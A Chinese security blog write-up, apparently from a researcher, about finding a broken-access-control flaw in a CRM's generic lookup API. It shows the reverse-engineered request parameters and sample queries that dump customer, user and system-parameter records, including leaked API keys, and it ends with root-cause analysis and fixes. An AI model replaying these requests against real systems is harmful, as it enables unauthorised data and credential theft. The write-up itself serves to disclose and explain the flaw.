---
title: 从一条审批API请求，挖掘严重漏洞
url: https://mp.weixin.qq.com/s/6bzWN9mP6wD5c0rwpGqA5A
source: Doonsec's feed
date: 2026-09-30
fetch_date: 2026-10-01T07:57:29.240216
---

# 从一条审批API请求，挖掘严重漏洞

# 从一条审批API请求，挖掘严重漏洞

原创

APT-101
APT-101

APT-101

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## 起点是一条很普通的请求

收到一个请求包，是页面里"查看审批流程"按钮发出来的：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNotzrb9W5ouN9fuSB0DVYYLuLKY71rknO7le6ic1tH2dkSOIbRzyOqqG9LrDjHQUB7LQcd1oT0Lklutg45PESTkchqVicjYJJsMY4/640?wx_fmt=png&from=appmsg)

```
GET /api/CrmFlow/GetFlowStepList?flowId=<xxx>&entityName=new_invadj&entityId=<xxx> HTTP/1.1Host: 192.168.0.1:8080User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: application/json, text/plain, */*Accept-Language: zh-CNAccept-Encoding: gzip, deflate, brAuthorization: Bearer xxxxConnection: keep-aliveReferer: http://192.168.0.1:8080/
```

参数只有三个，两个 GUID 加一个实体名。正常来说这种请求就是确认一下审批走到哪一步了，没什么可看的。

不过 `entityName=new_invadj` 这个参数我多看了两眼。这个值是从前端传过来的。既然是从前端传过来的，那它就不一定非得是 `new_invadj`——换成别的会怎么样？

## 第一轮：猜接口名，全是 404

第一反应是找通用接口。既然前端有"查找"这个动作，后端大概率有个能按实体名查数据的端点。

于是按常规命名猜了几个：`/api/GetList`、`/api/GetLookupData`、`/api/GetEntityData`，都是 404。

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNot71NnphfCEsibelQtKS7ZJOkGLhP81p5rXjp1RNvI6U1tFvsl1qX5CR1Cd5kGqtibELYOP2ic5MgqGbyCBHP02bqESZKEic1N3mS8/640?wx_fmt=png&from=appmsg)

到这里大部分人就会收手了，结论也很自然：没这个功能，这条路不通。我当时也差点这么记。

后来发现这个结论下早了。

## 那个 404 不一定代表接口不存在

这个站跑的是 ASP.NET Web API。它有个不太友好的行为：请求参数凑不齐的时候，路由层找不到能匹配的 Action，返回的不是 400 而是 404，响应体是 `No HTTP resource was found that matches the request URI '...'`。

这和"路径不存在"的 404 长得一模一样。

验证方法很简单，拿手上这条能正常返回的请求做减法，一次删一个参数：

```
GET /api/CrmFlow/GetFlowStepList?flowId=<flow-id>&entityId=<record-id> HTTP/1.1→ 404  No HTTP resource was found that matches the request URI '...'
GET /api/CrmFlow/GetFlowStepList?flowId=<flow-id>&entityName=new_invadj HTTP/1.1→ 404  No HTTP resource was found that matches the request URI '...'
```

删掉任何一个参数都是这个 404，三个都在才是 200。

也就是说，刚才那堆 404 里可能有一部分接口是真实存在的，只是参数没凑齐。继续盲猜参数名没什么意义——猜对了也证明不了猜对了。

所以换个方向：不猜接口，去看谁在调接口。

## 去翻前端 bundle

前端是 Vue2 + webpack。首屏加载了三个 JS，其中 `app.js` 有 311 KB，业务逻辑基本都在里面。下下来 grep 一下 `lookup`：

```
// app.js · LookupDialog 组件props: {  entity:          { type: String, required: true },  requestUrl:      { default: () => "../api/crmlookupview/getdata" },  nameField:       { default: () => "new_name" },  idField:         { default: function () { return this.entity + "id" } },  filterFields:    { default: () => "new_name" },  orderbyFields:   { default: () => "createdon desc" },  conditionFields: { default: () => "" },}
```

接口路径拿到了：`/api/crmlookupview/getdata`。这个名字靠猜是猜不出来的。

往下翻，拼 URL 的那个方法也在里面，逻辑一眼能看懂：

```
_fetchRecords() {  const n = this.requestUrl + "?entityName=" + this.entity    + "&page="        + this.pageIndex    + "&count="       + this.pageSize    + "&select="      + this.selectString                          // 字段    + "&orderby="     + this.orderbyString                         // 排序    + "&filter="      + this.filterString                          // 过滤字段名    + "&filterValue=" + encodeURIComponent(this.filterValue || "") // 过滤值    + "&condition="   + this.conditionString;                      // 额外条件  rt.get(n).then(res => {    this.tableData = res.Data;    this.totalRecordCount = res.TotalRecordCount;  });}
```

八个参数，我一个都没猜中。

## 把参数补齐

照着拼一遍：

```
GET /api/crmlookupview/getdata?entityName=new_invadj&page=1&count=1&select=new_name&orderby=createdon%20desc&filter=new_name&filterValue=&condition= HTTP/1.1Host: 192.0.2.10:8267Authorization: Bearer <502 字符>
```

```
{"Data":{"TotalRecordCount":7,"Data":[{"new_name":"IN2604210002"}]},"ErrorCode":0,"Message":null}
```

200，返回 7 条。

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNosC6BCRJzfr2NJiabQqvDLon0rwWUsyDghwdLRn4QW4fe4hPIUmmAHvdsfS0E61nLGic1eYn1sEx9SIice1gOAIZ6Uj1SJtb0NYtU/640?wx_fmt=png&from=appmsg)

这条响应一出来，前面那些 404 的性质就变了——它们不代表功能不存在，只代表我没读源码。

## 六个参数，四个维度

再回头看参数表。我习惯一个个问：这个值，客户端能自己定吗？

| 参数 | 客户端可控 | 决定什么 |
| --- | --- | --- |
| `entityName` | 是 | 查哪个实体 |
| `select` | 是 | 返回哪些字段 |
| `orderby` | 是 | 按什么排序 |
| `filter` / `filterValue` | 是 | 按什么条件筛 |
| `condition` | 是 | 自定义过滤表达式 |
| `page` / `count` | 是 | 分页与页大小 |

六个全部由前端拼装，服务端一个都没做覆盖或限制。而这六个合起来，正好是查询的四个维度：实体、记录、字段、排序。

## 换 entityName 试试

既然 `entityName` 是随便传的，那就换着来。

换成客户主数据实体：

```
GET /api/crmlookupview/getdata?entityName=account&page=1&count=1&select=name,accountid&orderby=name%20asc&filter=name&filterValue=&condition= HTTP/1.1
```

```
{"Data":{"TotalRecordCount":340968,...}}
```

换成用户实体：

```
GET /api/crmlookupview/getdata?entityName=systemuser&page=1&count=2&select=fullname,domainname&orderby=fullname%20asc&filter=fullname&filterValue=&condition= HTTP/1.1
```

```
{"Data":{"TotalRecordCount":407,  "Data":[{"fullname":"白**","domainname":"CORP\\0000xxxx"},          {"fullname":"柏**","domainname":"CORP\\0000xxxx"}]}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNottBc0DrLrHfyKKib4buoDO9v1MC0hXTsAcibTtUJic2icPLXMeSwrZlwdh8g8GEehQoFg7RHWib4EfP9pxqxKIp094n61OaCARAv0c/640?wx_fmt=png&from=appmsg)

换成系统参数表：

```
GET api/crmlookupview/getdata?entityName=new_systemparameter&page=1&count=2&select=new_name,new_value&orderby=new_name%20asc&filter=new_name&filterValue=&condition= HTTP/1.1
```

```
{"Data":{"TotalRecordCount":135,  "Data":[{"new_name":"advance_remind_time","new_value":"5"},          {"new_name":"AmapAK","new_value":"8070b2f5…de871"}]}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNouALfq6icVPaNxnum2bib1Diao7xiaRoiczmXVu8ia0yHSZibye7XWhX00SdhhlKuRhJTjOcwnduKRLvvsJReziaoeave7Yf132vTU7EJE/640?wx_fmt=png&from=appmsg)

第三个请求的问题不只是"能查系统参数表"。参数表里还躺着第三方地图的 API Key、企业微信的 CorpSecret、OAuth 的 clientid/clientsecret，以及 ERP / WMS / 发票平台的内网地址。凭据和横向移动的路线图，在一次查询里一起出来了。

接管Aliyun OSS Bucket

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNou9eiazAvsQyATao4ibOl5Wldmh8yrK5icBziaNCzsWUr2lWS1QjAxkFYzLCdfLLIR4drsXZVPAuNFqjUh4QGzblBuXu28yQLeWIiaM/640?wx_fmt=png&from=appmsg)

## 补一个对照实验

上面所有结论都压在同一个假设上：`TotalRecordCount` 这个数字真的跟着我传的条件走。

万一它是个写死的占位值呢？万一 `count=1` 只影响返回条数，计数其实是缓存呢？

所以得做对照。用的是最直接的一组：同一个实体、同一个字段，只改 `condition`，让条件恒真和恒假。

```
# 不加行级条件...&entityName=systemuser&filter=fullname&filterValue=&condition=→ TotalRecordCount: 407
# 加一个不可能成立的条件...&entityName=systemuser&filter=fullname&filterValue=&condition=fullname%20eq%20zzz_no_such→ TotalRecordCount: 0
```

407 掉到 0。

如果计数是占位的，它不会归零；如果服务端强制了行级范围，它也不会归零——那样的话行级范围应该和这个条件取交集，而不是被清空。行级范围确实由客户端的 `condition` 控制。

## 这个接口为什么长成这样

写到这里我停了一下，因为第一版报告里我把它写成了"开发忘了加权限判断"。这个说法不准确。

它的前端组件叫 `LookupDialog`，是个通用的"关联字段查找弹窗"。业务表单上任何关联字段点一下都会弹它，`entity` 是必填 prop，哪个页面调用就传哪个实体名。

要支持这个用法，后端就只能有一个接收任意实体名的通用查询端点。这是元数据驱动平台（Dynamics / Dataverse 这一系）的标准做法，不算设计失误。

问题在别的地方。这类平台自带一套声明式授权：安全角色 + 业务部门 + 记录所有权。这套东西不用写代码，只要查询是以调用者本人的身份执行的，平台会自动把不该看的行过滤掉。

而这个接口是用应用服务账号执行的。

执行身份一旦变成应用账号，这套授权就整套失效——安全角色判的不是调用者，业务部门拦不住，记录所有权也不属于它。所有行对所有人一致可见。

所以准确的说法是：它不是漏了一层检查，是把一层本来免费、自动生效的授权关掉了。

这也解释了为什么测试阶段发现不了。单部门的测试数据下，这层授权开着和关着，返回的行数一样。只有数据里出现"不该看见的行"，问题才会暴露。而生产环境里，这样的行有 34 万条。

另外，同一套封装层下面还有 `/api/crmdata`（通用 Dataverse 读写代理）和 `/api/crmpicklist/options/`（元数据枚举）。这是产品模板层面的结构，不是某个部署实例的临时产物。

## 修复

按根因往外排：

1. **把执行身份换回调用者**。用平台的模拟身份机制，让查询以调用者的安全角色执行。这样权限过滤由平台自动施加，不需要在业务代码里逐条写规则，也不会有"某个端点忘了写"。
2. **给通用接口设边界**。这个接口的定位是"帮用户挑一条记录填进表单"，那它返回的就该只有名称和 ID 两列，页大小要有上限，字段走白名单。现在它能返回任意字段（包括存凭据的 `new_value`），是因为没给自己设边界。
3. **密钥独立轮换**。这一条跟代码修复没关系。已经读出去的 API Key 不会因为改代码而失效，得把它移出业务表、进密钥管理，泄露的那批立刻重置，再去第三方控制台确认有没有被调用过。
4. **把 `TotalRecordCount` 收进权限范围**。它现在是全表计数，等于给任何人在任何表上开了一个免费的行数探测器。

## 最后

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNosaHSN0KnrwGZf9KT4MeDs0UYZ8JW7ZumT8vUjBCiakyYjSxf70LQzK59vx12sWuyiacB97ic9Utp3C9mXql58ut2NUb4eB93E6Ho/640?wx_fmt=png&from=appmsg)

回头看，这次挖洞里花时间最多的不是某个技巧，而是在 404 面前没有直接收手。

那堆 404 当时看着像"功能不存在"的铁证，其实只是参数不齐时路由层的噪声。解开它们靠的不是更聪明的扫描器，是一个 311 KB 的 JS 文件——前端把参数契约写得很清楚，只是没人去读。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/vgGymHXkYlHxHm5eWcF04Jiak4wbaPHuibiaRpMSS9cibMpn8zszwAmT9Oc2YYhJN1nowIDPnEgAddjclhcuDOaZtQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过